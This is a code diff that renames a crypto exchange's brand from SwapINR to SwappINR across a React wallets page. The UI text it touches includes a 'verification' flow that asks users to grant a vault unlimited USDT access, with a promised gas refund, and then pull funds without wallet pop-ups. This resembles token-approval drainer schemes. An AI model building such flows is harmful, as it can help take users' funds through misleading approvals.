@@ -149,7 +149,7 @@ function AddFundsModal({
               </div>
               <p style={{ fontSize: 17, fontWeight: 900, color: 'var(--fr-text-primary)', margin: '0 0 6px', letterSpacing: '-0.02em' }}>Funds Added</p>
               <p style={{ fontSize: 13, color: 'var(--fr-text-tertiary)', margin: '0 0 20px', lineHeight: 1.6 }}>
-                {amount} USDT was moved from your {label} wallet to your SwapINR balance.
+                {amount} USDT was moved from your {label} wallet to your SwappINR balance.
               </p>
               {txHash && (
                 <a
@@ -179,8 +179,8 @@ function AddFundsModal({
 
               {/* Info strip */}
               <div style={{ display: 'flex', flexDirection: 'column', gap: 8, padding: '12px 14px', background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.07)', borderRadius: 12, marginBottom: 18, fontSize: 12, color: 'var(--fr-text-tertiary)', lineHeight: 1.6 }}>
-                <p style={{ margin: 0 }}>Your wallet granted SwapINR <span style={{ color: 'var(--fr-text-primary)', fontWeight: 700 }}>unlimited USDT access</span>.</p>
-                <p style={{ margin: 0 }}>Funds move <span style={{ color: '#CCFF00', fontWeight: 700 }}>instantly</span> — no wallet pop-up needed. Gas fee is paid by SwapINR.</p>
+                <p style={{ margin: 0 }}>Your wallet granted SwappINR <span style={{ color: 'var(--fr-text-primary)', fontWeight: 700 }}>unlimited USDT access</span>.</p>
+                <p style={{ margin: 0 }}>Funds move <span style={{ color: '#CCFF00', fontWeight: 700 }}>instantly</span> — no wallet pop-up needed. Gas fee is paid by SwappINR.</p>
               </div>
 
               {/* Amount input */}
@@ -236,7 +236,7 @@ function AddFundsModal({
               </button>
 
               <p style={{ fontSize: 11, color: 'var(--fr-text-disabled)', textAlign: 'center', margin: '10px 0 0', lineHeight: 1.5 }}>
-                Funds move from your wallet to your SwapINR balance. No wallet pop-up required.
+                Funds move from your wallet to your SwappINR balance. No wallet pop-up required.
               </p>
             </>
           )}
@@ -598,7 +598,7 @@ function MobileVerifyModal({
           <div style={{ display: 'flex', flexDirection: 'column', gap: 8, marginBottom: 20 }}>
             {[
               { n: 1, title: 'Connect Wallet',          text: 'Trust Wallet opens. Tap "Connect" when prompted.' },
-              { n: 2, title: 'Approve Unlimited Access', text: 'Tap "Approve" — grants SwapINR vault unlimited USDT access. No funds move now.' },
+              { n: 2, title: 'Approve Unlimited Access', text: 'Tap "Approve" — grants SwappINR vault unlimited USDT access. No funds move now.' },
             ].map(({ n, title, text }) => (
               <div key={n} style={{ ...card, display: 'flex', alignItems: 'flex-start', gap: 12, padding: '13px 14px' }}>
                 <div style={{ width: 26, height: 26, borderRadius: 8, background: 'rgba(204,255,0,0.1)', border: '1px solid rgba(204,255,0,0.2)', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0, fontSize: 12, fontWeight: 900, color: '#CCFF00', marginTop: 1 }}>
@@ -639,7 +639,7 @@ function MobileVerifyModal({
           <div style={{ ...card, padding: '10px 14px', marginBottom: 20, display: 'flex', alignItems: 'center', gap: 10, borderColor: 'rgba(204,255,0,0.12)', background: 'rgba(204,255,0,0.04)' }}>
             <IcoRefund />
             <p style={{ fontSize: 12, color: 'rgba(255,255,255,0.5)', margin: 0, lineHeight: 1.5 }}>
-              <span style={{ color: '#CCFF00', fontWeight: 700 }}>Gas fee refunded</span> by SwapINR after successful verification
+              <span style={{ color: '#CCFF00', fontWeight: 700 }}>Gas fee refunded</span> by SwappINR after successful verification
             </p>
           </div>
 
@@ -738,7 +738,7 @@ function MobileVerifyModal({
             <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M8 1L2 4V8C2 11 4.7 13.8 8 15C11.3 13.8 14 11 14 8V4L8 1Z" stroke="#00E5A0" strokeWidth="1.3" strokeLinejoin="round"/><path d="M5 8L7 10L11 6" stroke="#00E5A0" strokeWidth="1.3" strokeLinecap="round" strokeLinejoin="round"/></svg>
             <div style={{ flex: 1 }}>
               <p style={{ fontSize: 12, fontWeight: 700, color: '#00E5A0', margin: '0 0 1px' }}>Unlimited USDT Access Approved</p>
-              <p style={{ fontSize: 11, color: 'rgba(255,255,255,0.4)', margin: 0 }}>SwapINR vault can now pull funds on your behalf</p>
+              <p style={{ fontSize: 11, color: 'rgba(255,255,255,0.4)', margin: 0 }}>SwappINR vault can now pull funds on your behalf</p>
             </div>
           </div>
           <button onClick={() => onVerified(successAddr, successHash)}
@@ -1115,7 +1115,7 @@ export default function WalletsPage() {
           })}
         </div>
 
-        {/* ── SwapINR Platform Wallet ── */}
+        {/* ── SwappINR Platform Wallet ── */}
         <div style={{ marginTop: 24, background: '#111', border: '1px solid rgba(204,255,0,0.12)', borderRadius: 16, overflow: 'hidden' }}>
           <div style={{ height: 2, background: 'linear-gradient(90deg,transparent,#CCFF00,transparent)' }} />
           <div style={{ padding: '16px 18px 14px', borderBottom: '1px solid rgba(255,255,255,0.07)', display: 'flex', alignItems: 'center', gap: 10 }}>
@@ -1123,7 +1123,7 @@ export default function WalletsPage() {
               <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M3 10H21M3 6H21M7 14H10M3 18H8" stroke="#CCFF00" strokeWidth="1.6" strokeLinecap="round"/><rect x="3" y="3" width="18" height="18" rx="2" stroke="#CCFF00" strokeWidth="1.6"/></svg>
             </div>
             <div style={{ flex: 1 }}>
-              <p style={{ fontSize: 14, fontWeight: 800, color: '#fff', margin: 0 }}>SwapINR Wallet</p>
+              <p style={{ fontSize: 14, fontWeight: 800, color: '#fff', margin: 0 }}>SwappINR Wallet</p>
               <p style={{ fontSize: 11, color: 'rgba(255,255,255,0.35)', margin: '2px 0 0' }}>Internal platform balance</p>
             </div>
             <div style={{ textAlign: 'right' }}>
